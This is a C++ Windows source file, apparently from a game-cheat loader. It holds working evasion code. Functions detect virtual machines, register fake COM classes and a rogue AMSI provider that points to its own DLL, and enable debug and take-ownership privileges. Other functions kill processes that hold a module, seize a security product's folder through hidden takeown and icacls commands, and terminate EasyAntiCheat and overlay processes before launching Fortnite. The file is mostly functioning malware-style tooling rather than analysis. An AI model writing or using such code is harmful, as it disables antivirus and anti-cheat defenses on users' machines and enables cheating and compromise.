#include "common.h"

#include <aclapi.h>
#include <psapi.h>
#include <tlhelp32.h>

namespace saryx {

bool detect_vm()
{
    static const char* kSigs[] = {
        "VMware", "VirtualBox", "Parallels", "Microsoft Hv", "QEMU", "KVM",
    };
    const DWORD size = GetSystemFirmwareTable('RSMB', 0, nullptr, 0);
    if (!size) return false;

    std::vector<unsigned char> table(size);
    if (!GetSystemFirmwareTable('RSMB', 0, table.data(), size)) return false;

    const std::string blob(reinterpret_cast<char*>(table.data()), table.size());
    for (const char* sig : kSigs)
        if (blob.find(sig) != std::string::npos) return true;
    return false;
}

void enable_privilege(const wchar_t* name)
{
    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
        return;

    LUID luid{};
    if (LookupPrivilegeValueW(nullptr, name, &luid)) {
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    }
    CloseHandle(token);
}

static void register_com_class(const wchar_t* clsid, const wchar_t* friendly,
                               const wchar_t* threading)
{
    const std::wstring base = std::wstring(L"SOFTWARE\\Classes\\CLSID\\") + clsid;
    reg_create(base);
    reg_set_string(base, L"", friendly);

    const std::wstring inproc = base + L"\\InprocServer32";
    reg_create(inproc);
    reg_set_string(inproc, L"", kLoaderPath);
    reg_set_string(inproc, L"ThreadingModel", threading);

    const std::wstring version = base + L"\\Version";
    reg_create(version);
    reg_set_string(version, L"", L"1.0");

    const std::wstring wow =
        std::wstring(L"SOFTWARE\\WOW6432Node\\Classes\\CLSID\\") + clsid +
        L"\\InprocServer32";
    reg_create(wow);
    reg_set_string(wow, L"", kLoaderPath);
}

void install_amsi_hijack()
{
    register_com_class(kClsidOa, L"OA_ComAntivirus Class", L"Apartment");
    reg_create(std::wstring(L"SOFTWARE\\Classes\\CLSID\\") + kClsidOa +
               L"\\Implemented Categories\\{56FFCC30-D398-11D0-B2AE-00A0C908FA49}");

    register_com_class(kClsidAmsi, L"AMSI_ComAntivirus Class", L"Both");

    reg_create(kAmsiProvider);
    reg_set_string(kAmsiProvider, L"", L"AMSI Provider");
    reg_set_string(kAmsiProvider, L"DllPath", kLoaderPath);

    reg_create(kMyCheatKey);
    reg_set_string(kMyCheatKey, L"DllPath", kPayloadPath);
    reg_set_string(kMyCheatKey, L"Trigger", L"0");

    enable_privilege(L"SeTakeOwnershipPrivilege");
    enable_privilege(L"SeDebugPrivilege");
    enable_privilege(L"SeRestorePrivilege");
    enable_privilege(L"SeBackupPrivilege");
}

static void kill_module_holders(const wchar_t* module)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                      FALSE, pe.th32ProcessID);
            if (!proc) continue;

            HMODULE mods[512]{};
            DWORD needed = 0;
            if (K32EnumProcessModules(proc, mods, sizeof(mods), &needed)) {
                for (DWORD i = 0; i < needed / sizeof(HMODULE); ++i) {
                    wchar_t name[MAX_PATH]{};
                    if (K32GetModuleBaseNameW(proc, mods[i], name, MAX_PATH) &&
                        _wcsicmp(name, module) == 0) {
                        TerminateProcess(proc, 0);
                        break;
                    }
                }
            }
            CloseHandle(proc);
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
}

void acl_takeover()
{
    kill_module_holders(kLoaderName);
    Sleep(400);
    run_hidden(L"attrib -H -S -R \"" + std::wstring(kKasDir) + L"\" /S /D");
    run_hidden(L"takeown /f \"" + std::wstring(kKasDir) + L"\" /A /R /D");
    run_hidden(L"icacls \"" + std::wstring(kKasDir) +
               L"\" /grant *S-1-5-32-544:F /T /C");
}

void kill_overlays()
{
    static const wchar_t* kTargets[] = {
        L"gameoverlayui.exe", L"NVIDIA App.exe", L"NVIDIA Overlay.exe",
        L"nvcontainer.exe", L"bcastdvr.exe", L"GameBarFTServer.exe",
        L"RTSS.exe", L"MSIAfterburner.exe", L"EasyAntiCheat.exe",
        L"EasyAntiCheat_EOS.exe", L"EpicOnlineServices.exe",
        L"FortniteClient-Win64-Shipping.exe",
        L"FortniteClient-Win64-Shipping_BE.exe",
    };
    for (const wchar_t* t : kTargets) taskkill(t);
}

} // namespace saryx